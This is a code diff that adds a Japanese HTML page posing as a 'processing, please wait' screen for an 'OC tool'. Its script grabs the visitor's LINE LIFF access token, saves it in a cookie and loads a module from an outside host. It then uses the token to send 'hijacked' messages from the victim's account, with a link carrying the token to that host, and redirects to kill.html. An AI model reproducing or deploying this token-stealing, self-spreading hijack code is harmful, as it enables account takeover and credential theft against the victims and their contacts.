@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="Cache-Control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OCツール</title>
+    <link href="./style.css" rel="stylesheet">
+</head>
+<body>
+  <font face="sans-serif">
+  <h1>処理中...</h1>
+  <p>しばらくお待ちください</p>
+  </font>
+  <script src="https://liff-tool.f5.si/mod.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/js-cookie@3.0.5/dist/js.cookie.min.js"></script>
+  <script>
+    let token=liffmod.hash.getAccessToken();
+    Cookies.set('token',token, {expires: 50});
+    liffmod.token.sendMessages([
+  {
+    "type": "flex",
+    "altText": "乗っ取り完了",
+    "contents": {
+      "type": "bubble",
+      "direction": "ltr",
+      "styles": {
+        "footer": {
+          "separator": true,
+          "separatorColor": "#F0F0F0"
+        }
+      },
+      "body": {
+        "type": "box",
+        "layout": "vertical",
+        "contents": [
+          {
+            "type": "box",
+            "layout": "vertical",
+            "contents": [
+              {
+                "type": "text",
+                "text": "OCツール",
+                "size": "sm",
+                "color": "#6486e3",
+                "weight": "bold",
+                "wrap": true
+              },
+              {
+                "type": "text",
+                "text": "乗っ取りました",
+                "size": "xl",
+                "color": "#000000",
+                "weight": "bold",
+                "wrap": true
+              }
+            ],
+            "paddingTop": "sm",
+            "paddingBottom": "sm"
+          },
+          {
+            "type": "box",
+            "layout": "vertical",
+            "contents": [
+              {
+                "type": "text",
+                "text": "乗っ取られました。乗っ取るには以下のサイトからメッセージを送信してください",
+                "size": "xs",
+                "color": "#555555",
+                "wrap": true
+              }
+            ],
+            "spacing": "sm",
+            "paddingTop": "md",
+            "paddingBottom": "md"
+          },
+          {
+            "type": "box",
+            "layout": "vertical",
+            "contents": [
+              {
+                "type": "button",
+                "action": {
+                  "type": "uri",
+                  "label": "メッセージを送る",
+                  "uri": `https://liff-tool.f5.si/#access_tokenn${token}`
+                },
+                "height": "sm"
+              }
+            ],
+            "paddingTop": "sm",
+            "paddingBottom": "sm"
+          }
+        ],
+        "spacing": "sm",
+        "paddingAll": "xl"
+      },
+      "footer": {
+        "type": "box",
+        "layout": "horizontal",
+        "contents": [
+          {
+            "type": "box",
+            "layout": "vertical",
+            "contents": [
+              {
+                "type": "image",
+                "url": "https://vos.line-scdn.net/service-notifier/footer_profile_layer.png",
+                "size": "full",
+                "position": "absolute",
+                "offsetTop": "0px",
+                "offsetBottom": "0px",
+                "offsetStart": "0px",
+                "offsetEnd": "0px"
+              }
+            ],
+            "width": "20px",
+            "height": "20px"
+          },
+          {
+            "type": "text",
+            "text": "OC Tools",
+            "size": "xs",
+            "gravity": "center",
+            "color": "#999999",
+            "weight": "bold"
+          },
+          {
+            "type": "box",
+            "layout": "horizontal",
+            "contents": [
+              {
+                "type": "image",
+                "url": "https://vos.line-scdn.net/service-notifier/footer_go_btn.png",
+                "size": "full",
+                "gravity": "center"
+              }
+            ],
+            "width": "12px"
+          }
+        ],
+        "spacing": "md",
+        "action": {
+          "type": "uri",
+          "label": "action",
+          "uri": "https://github.com/"
+        }
+      },
+      "size": "kilo"
+    }
+  }
+],token).then(()=>{location.href="./kill.html"})
+  </script>
+  </body>
+</html>
